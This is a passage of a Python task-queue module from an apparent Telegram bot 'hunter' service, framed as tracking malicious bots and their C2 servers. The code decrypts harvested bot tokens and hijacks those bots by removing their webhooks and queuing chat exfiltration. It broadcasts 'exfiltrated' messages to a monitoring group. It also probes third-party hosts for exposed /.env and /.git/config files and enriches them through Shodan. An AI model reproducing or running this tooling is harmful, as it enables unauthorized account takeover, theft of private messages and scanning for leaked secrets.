                        decrypted = security.decrypt(raw_token).strip()
                        async with httpx.AsyncClient(timeout=10.0) as _hc:
                            gm = await _hc.get(f"https://api.telegram.org/bot{decrypted}/getMe")
                            if gm.status_code == 200:
                                gm_data = gm.json().get("result", {})
                                resolved_username = gm_data.get("username")
                                if resolved_username:
                                    bot_username = resolved_username
                                    # Persist resolved username to DB
                                    fresh_meta = await async_execute(
                                        db.table("discovered_credentials")
                                        .select("meta").eq("id", cred_id).single()
                                    )
                                    upd_meta = dict((fresh_meta.data or {}).get("meta") or {})
                                    upd_meta["bot_username"] = bot_username
                                    await async_execute(
                                        db.table("discovered_credentials")
                                        .update({"meta": upd_meta}).eq("id", cred_id)
                                    )
                                    # Rename existing @unknown topic if it has a cached thread_id
                                    old_topic_id = upd_meta.get("topic_id")
                                    if old_topic_id:
                                        new_name = f"@{bot_username} / {bot_id}"
                                        await broadcaster.rename_topic(group_id, old_topic_id, new_name)
                                        logger.info(f"    Renamed topic {old_topic_id} from @unknown to @{bot_username}")
                except Exception as e_resolve:
                    logger.debug(f"[Broadcast] Could not resolve username for bot_id {bot_id}: {e_resolve}")

            if bot_username and bot_username != "unknown" and bot_id:
                 topic_name = f"@{bot_username} / {bot_id}"
            elif bot_id:
                 topic_name = f"@unknown / {bot_id}"
            elif meta.get("chat_name"):
                 topic_name = f"{meta.get('chat_name')} (Legacy)"
            else:
                 topic_name = f"Cred-{cred_id[:8]}"

            # 2. Check Cache/DB for ID
            thread_id = cached_topic_ids.get(cred_id) or meta.get("topic_id")

            if not thread_id:
                # Determines if we need to fetch token for legacy fallback
                if "unknown" in topic_name and not bot_id:
                     try:
                        cred_res = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id).single())
                        if cred_res.data:
                            # .single() returns a dict, not a list — access directly
                            raw_token = cred_res.data.get("bot_token") if isinstance(cred_res.data, dict) else cred_res.data[0]["bot_token"]
                            decrypted = security.decrypt(raw_token)
                            if ":" in decrypted:
                                bot_id = decrypted.split(":")[0]
                                meta["bot_id"] = bot_id
                                topic_name = f"@unknown / {bot_id}"
                     except Exception as e_dec:
                                logger.debug(f"[Broadcast] Could not decrypt token for legacy bot_id extraction: {e_dec}")

                # Ensure Topic — raises on failure so message is retried later
                try:
                    thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                except Exception as e_topic:
                    logger.error(f"    ❌ [Broadcast] Topic creation failed for {cred_id}: {e_topic}")
                    from app.services.broadcaster_srv import BroadcastSendError

                    await _mark_broadcast_failure(
                        msg,
                        BroadcastSendError(
                            "topic_missing",
                            f"Could not create topic '{topic_name}': {e_topic}",
                            retryable=True,
                        ),
                    )
                    continue

                # Re-fetch meta before write — prevents overwriting concurrent enrich updates
                fresh = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                meta = dict((fresh.data or {}).get("meta") or {})
                meta["topic_id"] = thread_id
                await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                logger.info(f"    📝 [Broadcast] Saved topic_id {thread_id} for {cred_id}")
            
            # Update local cache
            cached_topic_ids[cred_id] = thread_id
            
            # Send Message (with retry for deleted topics)
            send_success = False
            try:
                await broadcaster.send_message(group_id, thread_id, msg)
                send_success = True
            except Exception as e:
                # Check for topic deletion/not found
                err_str = str(e)
                failure_reason = getattr(e, "reason", "")
                if (
                    failure_reason == "topic_missing"
                    or "Topic_deleted" in err_str
                    or "message thread not found" in err_str
                    or "TOPIC_DELETED" in err_str
                ):
                    logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                    try:
                        thread_id = await broadcaster.ensure_topic(group_id, topic_name)
                        # Re-fetch meta before write
                        fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
                        meta = dict((fresh2.data or {}).get("meta") or {})
                        meta["topic_id"] = thread_id
                        await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
                        cached_topic_ids[cred_id] = thread_id
                        # Retry Send
                        await broadcaster.send_message(group_id, thread_id, msg)
                        send_success = True
                    except Exception as retry_e:
                        logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
                        await _mark_broadcast_failure(msg, retry_e)
                else:
                    logger.error(f"    ❌ Send failed: {e}")
                    await _mark_broadcast_failure(msg, e)
            
            if send_success:
                # ==============================================
                # SUCCESS: Mark as broadcasted and clear claim
                # ==============================================
                await _update_message_broadcast_success(msg_id)
                sent_count += 1
                logger.info(f"    ✅ Broadcasted msg {msg_id}")
            else:
                logger.warning(f"    🔄 Broadcast failure recorded for retry: {msg_id}")
            
            # Rate limit
            await asyncio.sleep(2.0) 

        except Exception as e:
            logger.error(f"Error broadcasting msg {msg_id}: {e}")
            try:
                await _mark_broadcast_failure(msg, e)
            except Exception as e_claim:
                logger.error(f"Failed to clear broadcast claim for msg {msg_id}: {e_claim} — message may be stuck until stale-claim TTL expires")
            continue
    
    result = f"Broadcasted {sent_count}/{len(messages)} messages"
    if skipped_count > 0:
        result += f" (skipped {skipped_count} claimed by other workers)"
    if already_done_count > 0:
        result += f" (already done: {already_done_count})"
    return result

@app.task(name="flow.system_heartbeat")
def system_heartbeat():
    """Periodic ping to confirm system uptime. Also flushes in-memory metrics to Redis."""
    msg = "💓 **System Heartbeat**: Worker is active and scanning."

    try:
        redis_client.set("system:heartbeat:last_seen", int(time.time()))
    except Exception as e:
        logger.warning(f"Failed to update heartbeat in Redis: {e}")

    # Flush in-memory metric counters to Redis so they survive restarts
    try:
        from app.core.metrics import metrics
        flushed = metrics.flush_to_redis()
        if not flushed:
            logger.warning("[Heartbeat] metrics.flush_to_redis() returned False — counters NOT persisted (Redis down?)")
    except Exception as e:
        logger.warning(f"Metrics flush failed (non-fatal): {e}")

    from app.workers.celery_app import get_worker_loop
    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
    return "Heartbeat sent."


@app.task(name="flow.queue_monitor")
def queue_monitor():
    """Return queue depths and oldest tracked job age for operational monitoring."""
    try:
        from app.core.queue_monitor import get_queue_snapshot

        snapshot = get_queue_snapshot(redis_client)
        logger.info(f"[QueueMonitor] {snapshot}")
        return snapshot
    except Exception as e:
        logger.warning(f"[QueueMonitor] failed: {e}")
        return {"error": str(e)}


@app.task(name="flow.canary_flow_check")
def canary_flow_check():
    """Run a synthetic DB -> broadcast -> visibility canary when configured."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_canary_flow_check_logic())


async def _canary_flow_check_logic():
    from datetime import datetime, timezone

    cred_id = settings.CANARY_CREDENTIAL_ID
    if not cred_id:
        return {"status": "disabled", "reason": "CANARY_CREDENTIAL_ID not configured"}

    now = datetime.now(timezone.utc)
    telegram_msg_id = -int(time.time())
    content = f"{settings.CANARY_EXPECTED_TEXT} {now.isoformat()}"
    row = {
        "credential_id": cred_id,
        "telegram_msg_id": telegram_msg_id,
        "sender_name": "telegramhunter-canary",
        "content": content,
        "media_type": "text",
        "file_meta": {"source": "canary", "created_at": now.isoformat()},
        "is_broadcasted": False,
        "broadcast_error": None,
        "broadcast_attempts": 0,
        "next_retry_at": None,
    }
    legacy_row = {
        key: value
        for key, value in row.items()
        if key not in {"broadcast_error", "broadcast_attempts", "next_retry_at"}
    }
    result: dict[str, Any] = {
        "status": "started",
        "credential_id": cred_id,
        "telegram_msg_id": telegram_msg_id,
        "inserted": False,
        "broadcasted": False,
        "frontend_visible": None,
    }
    try:
        try:
            await async_execute(
                db.table("exfiltrated_messages").upsert(
                    row,
                    on_conflict="credential_id,telegram_msg_id",
                    ignore_duplicates=False,
                )
            )
            _set_broadcast_reliability_columns_available(True)
        except Exception as insert_exc:
            if not _is_missing_broadcast_reliability_column(insert_exc):
                raise
            _set_broadcast_reliability_columns_available(False)
            await async_execute(
                db.table("exfiltrated_messages").upsert(
                    legacy_row,
                    on_conflict="credential_id,telegram_msg_id",
                    ignore_duplicates=False,
                )
            )
        result["inserted"] = True

        result["broadcast_result"] = await _broadcast_logic()

        # Poll for is_broadcasted with a short budget so distributed-claim
        # contention doesn't false-fail. If another worker won the claim lock,
        # the row will flip to is_broadcasted=True moments later once that
        # worker's send completes. Stop early on success or persisted error.
        CANARY_BROADCAST_POLL_SECONDS = 15.0
        CANARY_BROADCAST_POLL_INTERVAL = 3.0
        elapsed = 0.0
        polls = 0
        rows: list[dict[str, Any]] = []
        while True:
            polls += 1
            select_columns = (
                "id,is_broadcasted,broadcast_error"
                if _can_use_broadcast_reliability_columns()
                else "id,is_broadcasted"
            )
            try:
                check = await async_execute(
                    db.table("exfiltrated_messages")
                    .select(select_columns)
                    .eq("credential_id", cred_id)
                    .eq("telegram_msg_id", telegram_msg_id)
                    .limit(1)
                )
                if "broadcast_error" in select_columns:
                    _set_broadcast_reliability_columns_available(True)
            except Exception as select_exc:
                if not _is_missing_broadcast_reliability_column(select_exc):
                    raise
                _set_broadcast_reliability_columns_available(False)
                check = await async_execute(
                    db.table("exfiltrated_messages")
                    .select("id,is_broadcasted")
                    .eq("credential_id", cred_id)
                    .eq("telegram_msg_id", telegram_msg_id)
                    .limit(1)
                )
            rows = check.data or []
            done = (
                not rows
                or bool(rows[0].get("is_broadcasted"))
                or rows[0].get("broadcast_error") is not None
                or elapsed >= CANARY_BROADCAST_POLL_SECONDS
            )
            if done:
                break
            await asyncio.sleep(CANARY_BROADCAST_POLL_INTERVAL)
            elapsed += CANARY_BROADCAST_POLL_INTERVAL

        result["broadcast_poll_seconds"] = elapsed
        result["broadcast_polls"] = polls
        if rows:
            result["broadcasted"] = bool(rows[0].get("is_broadcasted"))
            result["broadcast_error"] = rows[0].get("broadcast_error")

        if settings.PUBLIC_FRONTEND_URL:
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(settings.PUBLIC_FRONTEND_URL)
                result["frontend_visible"] = response.status_code < 500
                result["frontend_status_code"] = response.status_code
            except Exception as frontend_exc:
                result["frontend_visible"] = False
                result["frontend_error"] = str(frontend_exc)[:300]

        passed = bool(result["inserted"] and result["broadcasted"])
        if result["frontend_visible"] is False:
            passed = False
        result["status"] = "ok" if passed else "failed"
        AuditLogger.log(
            AuditEvent.CANARY_FLOW_CHECK,
            credential_id=cred_id,
            details=result,
            success=passed,
        )
        return result
    except Exception as e:
        result["status"] = "failed"
        result["error"] = str(e)[:500]
        AuditLogger.log(
            AuditEvent.CANARY_FLOW_CHECK,
            credential_id=cred_id,
            details=result,
            success=False,
        )
        return result


# ============================================================
# Webhook Recon — passive probe of captured third-party webhook URLs
# Reads discovered_credentials.meta.webhook_url captured by
# validation_tasks.py, does DNS + HTTP + TLS fingerprinting, writes
# result back to meta.webhook_probe.
# ============================================================
_WEBHOOK_PROBE_SEMAPHORE_SIZE = 5
_WEBHOOK_PROBE_TIMEOUT_SECONDS = 10.0
_WEBHOOK_PROBE_BODY_PREVIEW_BYTES = 500
_WEBHOOK_PROBE_STALE_HOURS = 24


async def _probe_webhook_url(url: str) -> dict:
    """Passive probe: DNS + HTTP GET + TLS cert + web recon + Shodan. Returns fingerprint dict.

    Best-effort — any single sub-probe failure is caught and recorded in the
    result rather than raising. We probe untrusted C2 endpoints so cert
    verification is disabled (verify=False) and redirects are not followed.
    """
    import socket
    import ssl
    from datetime import datetime, timezone
    from urllib.parse import urlparse

    result: dict[str, Any] = {
        "probed_at": datetime.now(timezone.utc).isoformat(),
        "url": url,
    }
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        result["hostname"] = hostname
        result["port"] = port
        result["scheme"] = parsed.scheme
        result["path"] = parsed.path

        # DNS resolution
        try:
            infos = await asyncio.get_event_loop().getaddrinfo(hostname, port)
            ips = sorted({addr[4][0] for addr in infos})
            result["ip_addresses"] = ips
        except Exception as dns_exc:
            result["dns_error"] = str(dns_exc)[:150]

        # HTTP fingerprint — GET with no verify, no redirect follow
        try:
            start = time.monotonic()
            async with httpx.AsyncClient(
                timeout=_WEBHOOK_PROBE_TIMEOUT_SECONDS,
                verify=False,
                follow_redirects=False,
            ) as client:
                resp = await client.get(url)
            elapsed_ms = round((time.monotonic() - start) * 1000)
            result["response_time_ms"] = elapsed_ms
            result["http_status"] = resp.status_code
            # Header lowercase-keyed for consistency; keep only interesting ones
            headers = {k.lower(): v for k, v in resp.headers.items()}
            interesting = (
                "server",
                "x-powered-by",
                "cf-ray",
                "via",
                "x-cache",
                "x-served-by",
                "location",
                "content-type",
                "content-length",
                "x-request-id",
                "x-runtime",
                "set-cookie",
            )
            result["http_headers"] = {k: headers[k] for k in interesting if k in headers}
            body_text = resp.text[:_WEBHOOK_PROBE_BODY_PREVIEW_BYTES]
            result["http_body_preview"] = body_text
        except httpx.TimeoutException:
            result["http_error"] = "timeout"
        except Exception as http_exc:
            result["http_error"] = f"{type(http_exc).__name__}: {str(http_exc)[:150]}"

        # TLS cert introspection (https only) — parse DER via cryptography lib
        if parsed.scheme == "https":
            try:
                from cryptography import x509
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives import hashes

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

                def _fetch_cert_der():
                    with socket.create_connection((hostname, port), timeout=5) as sock:
                        with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                            return ssock.getpeercert(binary_form=True)

                der = await asyncio.to_thread(_fetch_cert_der)
                if der:
                    cert = x509.load_der_x509_certificate(der, default_backend())
                    result["tls_issuer"] = cert.issuer.rfc4514_string()
                    result["tls_subject"] = cert.subject.rfc4514_string()
                    result["tls_serial"] = format(cert.serial_number, "x")
                    try:
                        result["tls_not_before"] = cert.not_valid_before_utc.isoformat()
                        result["tls_not_after"] = cert.not_valid_after_utc.isoformat()
                    except AttributeError:
                        # cryptography < 42
                        result["tls_not_before"] = cert.not_valid_before.isoformat()
                        result["tls_not_after"] = cert.not_valid_after.isoformat()
                    try:
                        san_ext = cert.extensions.get_extension_for_class(
                            x509.SubjectAlternativeName
                        ).value
                        result["tls_san"] = sorted({n.value for n in san_ext})
                    except x509.ExtensionNotFound:
                        pass
                    try:
                        result["tls_fingerprint_sha256"] = cert.fingerprint(hashes.SHA256()).hex()
                    except Exception:
                        pass
            except Exception as tls_exc:
                result["tls_error"] = f"{type(tls_exc).__name__}: {str(tls_exc)[:150]}"

        # Web recon — probe common paths on the origin (site tree / login / sensitive files)
        if parsed.scheme in ("http", "https") and hostname:
            base = f"{parsed.scheme}://{hostname}"
            if (parsed.scheme == "https" and port != 443) or (parsed.scheme == "http" and port != 80):
                base = f"{base}:{port}"
            result["web_recon"] = await _probe_web_recon(base)

        # Shodan enrichment — pivot each IP to open ports, banners, tags
        ips = result.get("ip_addresses") or []
        if ips and getattr(settings, "SHODAN_KEY", None):
            result["shodan"] = await _probe_shodan_ips(ips[:5])
    except Exception as outer:
        result["error"] = f"{type(outer).__name__}: {str(outer)[:300]}"
    return result


# Common recon paths — status-only for admin/login (don't dump body of potentially
# sensitive dashboards), preview for public files like robots.txt / sitemap.xml.
_WEB_RECON_PREVIEW_PATHS = ("/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt")
_WEB_RECON_STATUS_PATHS = (
    "/admin",
    "/admin/",
    "/login",
    "/wp-admin/",
    "/wp-login.php",
    "/api",
    "/api/",
    "/dashboard",
    "/health",
    "/status",
    "/actuator",
    "/actuator/health",
    "/metrics",
    "/graphql",
    "/.git/config",
    "/.env",
    "/server-status",
)


async def _probe_web_recon(base_url: str) -> dict:
    """Probe common recon paths — bounded, best-effort, tight timeout per path."""
    import re

    findings: dict[str, dict] = {}
    async with httpx.AsyncClient(
        timeout=5.0, verify=False, follow_redirects=False
    ) as client:
        for path in _WEB_RECON_PREVIEW_PATHS:
            entry: dict[str, Any] = {}
            try:
                r = await client.get(base_url + path)
                entry["status"] = r.status_code
                if r.status_code == 200:
                    text = r.text
                    entry["preview"] = text[:400]
                    if path == "/":
                        m = re.search(r"<title[^>]*>([^<]{0,200})</title>", text, re.IGNORECASE)
                        if m:
                            entry["title"] = m.group(1).strip()
            except httpx.TimeoutException:
                entry["error"] = "timeout"
            except Exception as e:
                entry["error"] = f"{type(e).__name__}: {str(e)[:80]}"
            findings[path] = entry

        for path in _WEB_RECON_STATUS_PATHS:
            entry = {}
            try:
                r = await client.get(base_url + path)
                entry["status"] = r.status_code
                if r.status_code in (301, 302, 303, 307, 308):
                    entry["location"] = r.headers.get("location")
                elif r.status_code == 200 and path in ("/.git/config", "/.env", "/server-status"):
                    # Sensitive file leaks — capture a small preview
                    entry["leak_preview"] = r.text[:300]
            except httpx.TimeoutException:
                entry["error"] = "timeout"
            except Exception as e:
                entry["error"] = f"{type(e).__name__}: {str(e)[:80]}"
            findings[path] = entry

    # Extract sitemap URLs from sitemap.xml if present
    sitemap_entry = findings.get("/sitemap.xml") or {}
    if sitemap_entry.get("status") == 200 and sitemap_entry.get("preview"):
        try:
            urls = re.findall(r"<loc>([^<]+)</loc>", sitemap_entry["preview"])
            if urls:
                sitemap_entry["extracted_urls_sample"] = urls[:15]
        except Exception:
            pass

    return findings


async def _probe_shodan_ips(ips: list[str]) -> dict:
    """Look up each IP via Shodan REST — returns per-IP summary (org, ports, tags, hostnames)."""
    per_ip: dict[str, dict] = {}
    api_key = settings.SHODAN_KEY
    async with httpx.AsyncClient(timeout=8.0) as client:
        for ip in ips:
            try:
                r = await client.get(
                    f"https://api.shodan.io/shodan/host/{ip}",
                    params={"key": api_key, "minify": "true"},
                )
                if r.status_code == 200:
                    d = r.json()
                    per_ip[ip] = {
                        "org": d.get("org"),
                        "isp": d.get("isp"),
                        "asn": d.get("asn"),
                        "country_code": d.get("country_code"),
                        "city": d.get("city"),
                        "hostnames": (d.get("hostnames") or [])[:8],
                        "ports": d.get("ports") or [],
                        "tags": d.get("tags") or [],
                        "vulns": (d.get("vulns") or [])[:10],
                        "last_update": d.get("last_update"),
                    }
                elif r.status_code == 404:
                    per_ip[ip] = {"status": "not_indexed"}
                elif r.status_code == 401:
                    per_ip[ip] = {"error": "shodan_key_unauthorized"}
                    break  # no point probing further with a bad key
                else:
                    per_ip[ip] = {"error": f"http_{r.status_code}"}
            except httpx.TimeoutException:
                per_ip[ip] = {"error": "timeout"}
            except Exception as e:
                per_ip[ip] = {"error": f"{type(e).__name__}: {str(e)[:100]}"}
    return per_ip


@app.task(name="flow.probe_webhooks")
def probe_webhooks(max_per_run: int = 50, force: bool = False):
    """Probe captured webhook URLs — passive DNS + HTTP + TLS fingerprint."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_probe_webhooks_logic(max_per_run, force))


async def _probe_webhooks_logic(max_per_run: int, force: bool = False) -> dict:
    from datetime import datetime, timedelta, timezone

    now = datetime.now(timezone.utc)
    stale_cutoff = (now - timedelta(hours=_WEBHOOK_PROBE_STALE_HOURS)).isoformat()

    # Fetch a bounded slice — population of bots with webhook is small.
    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, bot_username, bot_id, meta")
        .order("updated_at", desc=True)
        .limit(2000)
    )

    candidates = []
    for row in res.data or []:
        meta = row.get("meta") or {}
        webhook_url = meta.get("webhook_url")
        if not webhook_url:
            continue
        if not force:
            last_probe = (meta.get("webhook_probe") or {}).get("probed_at")
            if last_probe and last_probe > stale_cutoff:
                continue
        candidates.append((row, meta, webhook_url))
        if len(candidates) >= max_per_run:
            break

    if not candidates:
        return {"status": "idle", "reason": "no candidates due for probe"}

    sem = asyncio.Semaphore(_WEBHOOK_PROBE_SEMAPHORE_SIZE)
    summaries: list[dict] = []

    async def _probe_one(row, meta, webhook_url):
        async with sem:
            probe = await _probe_webhook_url(webhook_url)
            new_meta = {**meta, "webhook_probe": probe}
            try:
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": new_meta})
                    .eq("id", row["id"])
                )
            except Exception as upd_exc:
                probe["_persist_error"] = str(upd_exc)[:200]

            AuditLogger.log(
                AuditEvent.WEBHOOK_PROBED,
                credential_id=row["id"],
                details={
                    "url": webhook_url,
                    "http_status": probe.get("http_status"),
                    "server": (probe.get("http_headers") or {}).get("server"),
                    "ip_addresses": probe.get("ip_addresses"),
                    "tls_issuer": probe.get("tls_issuer"),
                    "shodan_orgs": [
                        v.get("org") for v in (probe.get("shodan") or {}).values() if isinstance(v, dict) and v.get("org")
                    ] or None,
                    "error": probe.get("error") or probe.get("http_error"),
                },
                success=probe.get("http_status") is not None,
            )
            return {
                "bot_username": row.get("bot_username"),
                "bot_id": row.get("bot_id"),
                "url": webhook_url,
                "status": probe.get("http_status"),
                "server": (probe.get("http_headers") or {}).get("server"),
                "ip": (probe.get("ip_addresses") or [None])[0],
                "tls_issuer": probe.get("tls_issuer"),
                "shodan_first": next(
                    (v for v in (probe.get("shodan") or {}).values() if isinstance(v, dict) and v.get("org")),
                    None,
                ),
                "http_err": probe.get("http_error"),
                "dns_err": probe.get("dns_error"),
            }

    summaries = await asyncio.gather(
        *(_probe_one(row, meta, url) for row, meta, url in candidates),
        return_exceptions=True,
    )

    ok = [s for s in summaries if isinstance(s, dict) and s.get("status") is not None]
    errs = [s for s in summaries if isinstance(s, Exception) or (isinstance(s, dict) and s.get("status") is None)]

    header = (
        f"🕵️ Webhook Recon: probed {len(candidates)} — "
        f"reachable {len(ok)}, errored {len(errs)}"
    )
    lines = [header, ""]
    for s in ok[:25]:
        bot = s.get("bot_username") or f"id={s.get('bot_id') or '?'}"
        server = (s.get("server") or "?")[:30]
        ip = s.get("ip") or "?"
        status = s.get("status")
        url_short = (s.get("url") or "")[:80]
        lines.append(f"• @{bot} [{status}] srv={server} ip={ip}\n  {url_short}")
    if errs:
        lines.append("")
        lines.append(f"Errored ({len(errs)}):")
        for s in errs[:15]:
            if isinstance(s, dict):
                bot = s.get("bot_username") or f"id={s.get('bot_id') or '?'}"
                err = s.get("http_err") or s.get("dns_err") or "unknown"
                lines.append(f"• @{bot} — {err[:80]}")
    summary_msg = "\n".join(lines)[:4000]

    try:
        await get_broadcaster().send_log(summary_msg)
    except Exception as bcast_exc:
        logger.warning(f"[WebhookProbe] Failed to post summary: {bcast_exc}")

    return {
        "status": "ok",
        "probed": len(candidates),
        "reachable": len(ok),
        "errored": len(errs),
    }


@app.task(name="flow.pin_webhook_url")
def pin_webhook_url(
    credential_id: str | None = None,
    webhook_url: str = "",
    evidence: dict | None = None,
    bot_token: str | None = None,
):
    """Post the captured webhook URL to the credential's topic and pin it.

    Fire-and-forget task dispatched from the scraper right BEFORE we call
    deleteWebhook — preserves the URL in a visible, pinned location so we
    still have it after wiping the remote registration.

    Accepts either credential_id (direct) or bot_token (looked up via
    sha256 hash in discovered_credentials.token_hash).
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _pin_webhook_url_logic(credential_id, webhook_url, evidence or {}, bot_token)
    )


async def _pin_webhook_url_logic(
    credential_id: str | None,
    webhook_url: str,
    evidence: dict,
    bot_token: str | None = None,
) -> dict:
    import hashlib

    if not webhook_url:
        return {"status": "invalid_args", "reason": "webhook_url required"}

    # Resolve credential_id from bot_token if not provided
    if not credential_id and bot_token:
        try:
            token_hash = hashlib.sha256(bot_token.encode()).hexdigest()
            lookup = await async_execute(
                db.table("discovered_credentials")
                .select("id")
                .eq("token_hash", token_hash)
                .limit(1)
            )
            if lookup.data:
                credential_id = lookup.data[0]["id"]
        except Exception as e:
            return {"status": "token_lookup_failed", "error": str(e)[:200]}

    if not credential_id:
        return {"status": "no_credential_id"}

    try:
        row = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, bot_id, chat_name, meta")
            .eq("id", credential_id)
            .limit(1)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    if not row.data:
        return {"status": "credential_not_found"}

    cred = row.data[0]
    meta = cred.get("meta") or {}
    bot_username = cred.get("bot_username")
    bot_id = cred.get("bot_id")
    topic_id = meta.get("topic_id")

    # Resolve/create topic if missing
    broadcaster = get_broadcaster()
    if not topic_id:
        if bot_username:
            topic_name = f"@{bot_username} / {bot_id}"
        elif bot_id:
            topic_name = f"@unknown / {bot_id}"
        else:
            topic_name = f"Cred-{credential_id[:8]}"
        try:
            topic_id = await broadcaster.ensure_topic(settings.MONITOR_GROUP_ID, topic_name)
            new_meta = {**meta, "topic_id": topic_id}
            try:
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"meta": new_meta})
                    .eq("id", credential_id)
                )
            except Exception:
                pass
        except Exception as topic_exc:
            return {"status": "topic_create_failed", "error": str(topic_exc)[:200]}

    if not topic_id:
        return {"status": "no_topic"}

    # Compose the pin — plain text, no Markdown parse (URL may contain unbalanced chars)
    header = f"🔗 Captured webhook URL (before takeover)"
    lines = [header, "", webhook_url, ""]
    if bot_username or bot_id:
        lines.append(f"Bot: @{bot_username or '?'} ({bot_id or '?'})")

    # Enrich with probe forensics (TLS issuer, Shodan orgs, hostnames) if available
    probe = meta.get("webhook_probe") if isinstance(meta, dict) else None
    if isinstance(probe, dict):
        tls_issuer = probe.get("tls_issuer")
        tls_subject = probe.get("tls_subject")
        tls_not_after = probe.get("tls_not_after")
        if tls_issuer:
            lines.append(f"- tls_issuer: {tls_issuer}")
        if tls_subject:
            lines.append(f"- tls_subject: {tls_subject}")
        if tls_not_after:
            lines.append(f"- tls_not_after: {tls_not_after}")

        ip_addresses = probe.get("ip_addresses") or []
        if ip_addresses:
            lines.append(f"- ips: {', '.join(ip_addresses[:4])}")

        shodan = probe.get("shodan") or {}
        if isinstance(shodan, dict):
            orgs = set()
            open_ports = set()
            for _ip, info in shodan.items():
                if isinstance(info, dict):
                    if info.get("org"):
                        orgs.add(str(info["org"]))
                    for p in info.get("ports", []) or []:
                        open_ports.add(str(p))
            if orgs:
                lines.append(f"- shodan_orgs: {', '.join(sorted(orgs))}")
            if open_ports:
                sorted_ports = sorted(open_ports, key=lambda x: int(x) if x.isdigit() else 99999)
                lines.append(f"- open_ports: {', '.join(sorted_ports[:12])}")

        web_recon = probe.get("web_recon") or {}
        if isinstance(web_recon, dict):
            reachable = [p for p, r in web_recon.items() if isinstance(r, dict) and r.get("status") == 200]
            if reachable:
                lines.append(f"- reachable_paths: {', '.join(reachable[:8])}")

    for k, v in (evidence or {}).items():
        if k in ("delete_policy", "webhook_url"):
            continue
        if isinstance(v, (str, int, float, bool)) or v is None:
            lines.append(f"- {k}: {v}")
    msg = "\n".join(lines)[:3900]

    sent_msg_id = await broadcaster.send_to_thread(
        settings.MONITOR_GROUP_ID, topic_id, msg, parse_mode=None
    )
    if not sent_msg_id:
        return {"status": "send_failed", "topic_id": topic_id}

    pinned = await broadcaster.pin_message(settings.MONITOR_GROUP_ID, sent_msg_id)

    # Persist the pinned msg id in meta for future reference / cleanup
    try:
        from datetime import datetime, timezone

        new_meta = {
            **meta,
            "topic_id": topic_id,
            "pinned_webhook_msg_id": sent_msg_id,
            "pinned_webhook_at": datetime.now(timezone.utc).isoformat(),
        }
        await async_execute(
            db.table("discovered_credentials")
            .update({"meta": new_meta})
            .eq("id", credential_id)
        )
    except Exception:
        pass

    return {
        "status": "ok",
        "topic_id": topic_id,
        "message_id": sent_msg_id,
        "pinned": pinned,
    }


@app.task(name="flow.force_webhook_takeover_pass")
def force_webhook_takeover_pass(max_credentials: int = 200):
    """Queue immediate exfiltrate for every active credential that has a captured
    webhook_url. Bypasses the rescrape cursor so takeovers happen in seconds.
    """
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(
        _force_webhook_takeover_logic(max_credentials)
    )


async def _force_webhook_takeover_logic(max_credentials: int) -> dict:
    try:
        res = await async_execute(
            db.table("discovered_credentials")
            .select("id, bot_username, bot_id, meta")
            .eq("status", "active")
            .order("updated_at", desc=True)
            .limit(2500)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    queued: list[str] = []
    for row in res.data or []:
        meta = row.get("meta") or {}
        if not meta.get("webhook_url"):
            continue
        try:
            app.send_task("flow.exfiltrate_chat", args=[row["id"]], queue="scrape")
            queued.append(row["id"])
        except Exception as e:
            logger.warning(f"[ForceTakeover] enqueue failed for {row['id']}: {e}")
        if len(queued) >= max_credentials:
            break

    logger.info(f"[ForceTakeover] enqueued {len(queued)} credentials for immediate rescrape")
    try:
        await get_broadcaster().send_log(
            f"⚡ Force takeover pass — enqueued {len(queued)} webhook-registered bots for immediate rescrape"
        )
    except Exception:
        pass

    return {"status": "ok", "queued": len(queued)}


@app.task(name="flow.report_pin_metrics")
def report_pin_metrics():
    """Broadcast a summary of webhook takeover activity — pins performed,
    webhook URLs captured, and top C2 hosts. Scheduled every 12h."""
    from app.workers.celery_app import get_worker_loop

    return get_worker_loop().run_until_complete(_report_pin_metrics_logic())


async def _report_pin_metrics_logic() -> dict:
    from collections import Counter
    from urllib.parse import urlparse

    # Total credentials with a captured webhook URL
    try:
        total_captured = await async_execute(
            db.table("discovered_credentials")
            .select("id", count="exact")
            .not_.is_("meta->>webhook_url", "null")
        )
        total_pinned = await async_execute(
            db.table("discovered_credentials")
            .select("id", count="exact")
            .not_.is_("meta->>pinned_webhook_msg_id", "null")
        )
        recent = await async_execute(
            db.table("discovered_credentials")
            .select("bot_username, meta")
            .not_.is_("meta->>webhook_url", "null")
            .order("updated_at", desc=True)
            .limit(400)
        )
    except Exception as e:
        return {"status": "db_lookup_failed", "error": str(e)[:200]}

    captured_count = total_captured.count or 0
    pinned_count = total_pinned.count or 0
    coverage_pct = (pinned_count / captured_count * 100) if captured_count else 0.0

    # Aggregate top C2 hostnames
    host_counter: Counter = Counter()
    for row in recent.data or []:
        meta = row.get("meta") or {}
        url = meta.get("webhook_url")
        if not url:
            continue
        try:
            host = urlparse(url).hostname
            if host:
